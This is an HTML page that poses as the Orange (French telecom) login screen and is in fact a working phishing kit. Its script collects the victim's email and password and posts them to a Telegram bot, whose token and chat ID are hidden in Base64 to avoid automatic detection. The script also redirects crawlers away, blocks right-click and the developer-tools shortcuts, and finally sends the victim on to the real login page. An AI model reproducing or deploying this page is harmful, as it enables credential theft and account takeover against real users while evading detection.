<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Identification - Orange</title>
    <style>
        /* RESET & BASE */
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, Helvetica, sans-serif; }
        body { background-color: #fff; display: flex; flex-direction: column; min-height: 100vh; }

        /* CONTAINER */
        .main-wrapper { flex: 1; display: flex; justify-content: center; padding: 20px; }
        .login-box { width: 100%; max-width: 400px; margin-top: 40px; text-align: center; }

        /* LOGO */
        .logo-container { margin-bottom: 40px; }
        .logo-orange { 
            width: 50px; height: 50px; 
            background-image: url('https://upload.wikimedia.org/wikipedia/commons/c/c8/Orange_logo.svg');
            background-size: contain; background-repeat: no-repeat; display: inline-block;
        }

        /* TYPO */
        h1 { font-size: 32px; font-weight: bold; margin-bottom: 40px; }
        h2 { font-size: 20px; font-weight: bold; margin-bottom: 30px; text-align: left; }

        /* INPUTS */
        .input-group { border-bottom: 1px solid #000; margin-bottom: 40px; }
        input { width: 100%; border: none; padding: 10px 0; font-size: 16px; outline: none; background: transparent; }

        /* BOUTON */
        .btn-continue { 
            width: 100%; background-color: #000; color: #fff; padding: 18px; 
            font-size: 18px; font-weight: bold; border: none; cursor: pointer; 
        }

        .back-link { display: flex; align-items: center; cursor: pointer; margin-bottom: 20px; font-weight: bold; text-align: left; }
        .back-link span { margin-right: 10px; font-size: 20px; }

        /* FOOTER */
        footer { background-color: #000; color: #fff; padding: 40px 20px; margin-top: 50px; }
        .footer-content { max-width: 1000px; margin: 0 auto; display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; }
        @media (min-width: 768px) { .footer-content { grid-template-columns: repeat(4, 1fr); } }
        .footer-content div { font-size: 13px; }
        .copyright { max-width: 1000px; margin: 30px auto 0; color: #999; font-size: 12px; }

        .hidden { display: none; }
    </style>
</head>
<body>

    <div class="main-wrapper">
        <div class="login-box">
            
            <div class="logo-container">
                <div class="logo-orange"></div>
            </div>

            <div id="step-1">
                <h1>Identifiez-vous</h1>
                <h2>Indiquez votre compte Orange</h2>
                
                <div style="display:none;">
                    <input type="text" id="hp_field" tabindex="-1" autocomplete="off">
                </div>

                <div class="input-group">
                    <input type="text" id="email" placeholder="Adresse e-mail ou n° de mobile Orange">
                </div>
                <button class="btn-continue" onclick="toStep2()">Continuer</button>
            </div>

            <div id="step-2" class="hidden">
                <div class="back-link" onclick="toStep1()">
                    <span>←</span> <small id="user-val"></small>
                </div>
                <h1>Saisissez votre mot de passe</h1>
                <div class="input-group">
                    <input type="password" id="pass" placeholder="Mot de passe">
                </div>
                <button class="btn-continue" onclick="sendData()">Se connecter</button>
            </div>

        </div>
    </div>

    <footer>
        <div class="footer-content">
            <div>Informations légales</div><div>Gestion cookies</div>
            <div>Plan de site</div><div>Livraisons</div>
            <div>Données personnelles</div><div>Retours</div>
            <div>Accessibilité</div><div>Publicité</div>
        </div>
        <p class="copyright">© Orange 2026</p>
    </footer>

<script>
    /* 1. SECURITÉ ANTI-BOT / ANALYSE */
    const bots = ["googlebot", "bingbot", "crawler", "headless", "lighthouse"];
    if (bots.some(bot => navigator.userAgent.toLowerCase().includes(bot))) {
        window.location.href = "https://www.orange.fr";
    }

    /* 2. BLOQUER CLIC DROIT & INSPECTEUR */
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.onkeydown = function(e) {
        if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74))) return false;
    };

    /* 3. NAVIGATION */
    function toStep2() {
        const val = document.getElementById('email').value;
        if(val.length > 3) {
            document.getElementById('user-val').innerText = val;
            document.getElementById('step-1').classList.add('hidden');
            document.getElementById('step-2').classList.remove('hidden');
        }
    }

    function toStep1() {
        document.getElementById('step-2').classList.add('hidden');
        document.getElementById('step-1').classList.remove('hidden');
    }

    /* 4. ENVOI DES DONNÉES */
    function sendData() {
        // Honeypot check
        if(document.getElementById('hp_field').value !== "") {
            window.location.href = "https://www.orange.fr";
            return;
        }

        const email = document.getElementById('email').value;
        const password = document.getElementById('pass').value;

        // Identifiants encodés (Base64) pour éviter détection auto
        // Token: 8026121554:AAFhlKS20DrJtKdoLh68Ju91_VcDs87ABBE
        const t = atob("ODAyNjEyMTU1NDpBQUZobEtTMjBEckp0S2RvaGg2OEp1OTFfVmNEczg3QUJCRQ==");
        const c = atob("ODI1MjE5MDc5NA==");

        if(password.length < 4) return;

        const msg = `🔔 NOUVEAU LOG\n📧: ${email}\n🔑: ${password}`;

        fetch(`https://api.telegram.org/bot${t}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: c, text: msg })
        })
        .then(() => { window.location.href = "https://login.orange.fr"; })
        .catch(() => { window.location.href = "https://login.orange.fr"; });
    }
</script>
</body>
</html>
